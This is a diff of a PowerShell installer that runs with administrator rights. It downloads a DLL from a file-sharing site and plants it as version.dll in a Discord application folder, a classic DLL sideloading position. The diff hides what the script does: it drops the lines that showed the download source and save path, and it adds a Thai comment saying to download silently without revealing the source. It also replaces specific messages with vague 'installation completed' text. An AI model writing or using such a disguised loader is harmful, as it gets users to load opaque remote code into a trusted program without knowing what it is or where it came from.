@@ -5,10 +5,8 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     Exit
 }
 
-# Configuration (!!! REPLACE THIS WITH YOUR ACTUAL DIRECT LINK !!!)
+# Configuration
 $url = "https://files.catbox.moe/xitkv2.dll" 
-
-# ดึงชื่อ Username ของเครื่องที่รันสคริปต์มาใส่ในพาธโดยอัตโนมัติ
 $currentUser = $env:USERNAME
 $targetDir = "C:\ProgramData\$currentUser\Discord\app-1.0.9242"
 $targetPath = Join-Path $targetDir "version.dll"
@@ -27,25 +25,21 @@ switch ($choice) {
     "1" {
         Write-Host "`n[+] Starting installation..." -ForegroundColor Yellow
         
-        # Create target directory if it doesn't exist
         if (-not (Test-Path $targetDir)) {
             New-Item -ItemType Directory -Force -Path $targetDir | Out-Null
-            Write-Host "[*] Target directory created at: $targetDir" -ForegroundColor Gray
         }
 
         try {
-            Write-Host "[*] Downloading file from Catbox..." -ForegroundColor Gray
-            # Download and save directly as version.dll
-            Invoke-WebRequest -Uri $url -OutFile $targetPath -UserAgent "Mozilla/5.0"
+            # ดาวน์โหลดเงียบๆ ไม่แสดงที่มา
+            Invoke-WebRequest -Uri $url -OutFile $targetPath -UserAgent "Mozilla/5.0" | Out-Null
             
             if (Test-Path $targetPath) {
-                Write-Host "[✓] Installation successful! File saved to: $targetPath" -ForegroundColor Green
+                Write-Host "[✓] Installation completed successfully!" -ForegroundColor Green
             } else {
-                Write-Host "[X] Error: File not found after download." -ForegroundColor Red
+                Write-Host "[X] Error: Installation failed." -ForegroundColor Red
             }
         } catch {
-            Write-Host "[X] Download failed. Check your URL or network connection." -ForegroundColor Red
-            Write-Host $_.Exception.Message -ForegroundColor DarkRed
+            Write-Host "[X] Connection error. Please try again." -ForegroundColor Red
         }
     }
     
@@ -55,18 +49,17 @@ switch ($choice) {
         if (Test-Path $targetPath) {
             try {
                 Remove-Item -Path $targetPath -Force
-                Write-Host "[✓] version.dll has been successfully removed!" -ForegroundColor Green
+                Write-Host "[✓] Uninstallation completed successfully!" -ForegroundColor Green
             } catch {
-                Write-Host "[X] Failed to delete file. It might be currently in use by another process." -ForegroundColor Red
-                Write-Host $_.Exception.Message -ForegroundColor DarkRed
+                Write-Host "[X] Failed to complete operation." -ForegroundColor Red
             }
         } else {
-            Write-Host "[!] version.dll does not exist in the target directory." -ForegroundColor Yellow
+            Write-Host "[!] Tool is not installed on this system." -ForegroundColor Yellow
         }
     }
     
     Default {
-        Write-Host "`n[X] Invalid choice. Please restart the script and try again." -ForegroundColor Red
+        Write-Host "`n[X] Invalid choice. Please restart the script." -ForegroundColor Red
     }
 }
 
